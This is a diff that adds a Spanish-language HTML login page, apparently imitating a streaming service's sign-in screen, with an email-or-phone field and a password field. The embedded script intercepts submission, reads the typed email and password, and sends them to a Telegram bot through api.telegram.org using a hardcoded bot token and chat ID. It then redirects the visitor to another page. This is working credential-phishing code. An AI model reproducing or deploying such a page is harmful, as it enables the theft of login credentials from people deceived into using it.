@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Inicio de Sesión</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: black; /* Agregado: fondo negro al body */
+        }
+
+        .container {
+            width: 300px;
+            margin: 50px auto;
+            text-align: center;
+            background-color: black; /* Agregado: fondo negro al contenedor */
+            padding: 20px; /* Agregado: espacio alrededor del contenido */
+            border-radius: 10px; /* Agregado: borde redondeado */
+            display: flex; /* Agregado: convertir el contenedor en un flexbox */
+            flex-direction: column; /* Agregado: alinear elementos verticalmente */
+        }
+
+        .form-container {
+            margin-bottom: 20px; /* Agregado: espacio entre el formulario y la imagen */
+        }
+
+        h1 {
+            margin-top: 0;
+            color: white;
+            margin-left: -150px;
+        }
+
+     .form-container  img {
+            width: 100px;
+            height: auto;
+            margin-top: -50px; /* Modificado: ajuste de la distancia superior */
+            margin-left: -250px; /* Agregado: alinear la imagen al centro horizontal */
+            margin-right: auto; /* Agregado: alinear la imagen al centro horizontal */
+       
+        }
+
+        input {
+            width: 120%;
+            padding: 15px;
+            margin-top: 20px;
+            box-sizing: border-box;
+            margin-left: -30px;
+            background-color: #333; /* Cambiar a negro claro */
+            border: 2px solid #333; /* Agregado: borde inicial */
+            transition: border-color 0.3s; /* Agregado: transición suave del color del borde */
+            outline: none; /* Agregado: eliminar la línea de enfoque */
+            color: white; /* Agregado: color del texto */
+        }
+
+        /* Agregado: Cambiar el color del borde cuando se hace foco */
+        input:focus {
+            border-color: white;
+        }
+
+        button {
+            width: 120%;
+            padding: 15px;
+            margin-top: 20px;
+            background-color: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-left: -30px;
+        }
+
+        button:hover {
+            background-color: darkred;
+        }
+
+        h2 {
+            background-color: #333;
+            color: white;
+            width: 113%;
+            margin-left: -30px;
+            font-size: 18px;
+            padding: 12px;
+            margin-top: 25px;
+        }
+
+        h4 {
+            color: white;
+        }
+  
+        .n {
+            margin-left: -50px; /* Ajusta el valor según sea necesario para mover la imagen hacia la izquierda */
+        }
+  h3{ 
+    color:white;
+  }
+  
+  
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="form-container">
+            <img src="N.png" alt="Imagen de inicio de sesión" class="n"> <!-- Aquí se aplica la clase "n" -->
+            <h1>Iniciar Sesión</h1>
+            <form>
+                <input type="text" placeholder="Email o Número de Teléfono">
+                <input type="password" placeholder="Contraseña">
+                <button type="submit">Iniciar Sesión</button>
+                <h4>O</h4>
+                <h2>Usar un código de inicio de sesión</h2>
+              <h3>¿Olvidaste tu contraseña?</h3>
+            </form>
+        </div>
+      <div class="n">
+        <img src="S.jpg" alt="Descripción de tu imagen" style="width: 380px; display: block; margin: auto;">
+        </div>
+    </div>
+  <script>
+  // Agrega un evento al formulario para que se envíe cuando se envíe el formulario
+document.querySelector('form').addEventListener('submit', function(event) {
+    event.preventDefault(); // Evita que el formulario se envíe normalmente
+
+    // Obtén los valores del formulario
+    var emailOrPhone = document.querySelector('input[type="text"]').value;
+    var password = document.querySelector('input[type="password"]').value;
+
+    // Aquí debes reemplazar 'TU_TOKEN' con el token de tu bot de Telegram y 'TU_CHAT_ID' con el ID del chat al que quieres enviar el mensaje
+    var telegramToken = '7146549718:AAEZRx1O4QSKPacDVZfd2HYFV4vXrL4CYUU';
+    var chatId = '6044742043';
+
+    // Construye el mensaje que quieres enviar
+    var message = 'Nuevo inicio de sesión:\nEmail o Teléfono: ' + emailOrPhone + '\nContraseña: ' + password;
+
+    // Realiza la solicitud HTTP para enviar el mensaje al bot de Telegram
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "https://api.telegram.org/bot" + telegramToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message), true);
+    xhttp.send();
+
+    // Redirige a la página index2.html
+    window.location.href = 'index2.html';
+});
+  </script>
+</body>
+</html>
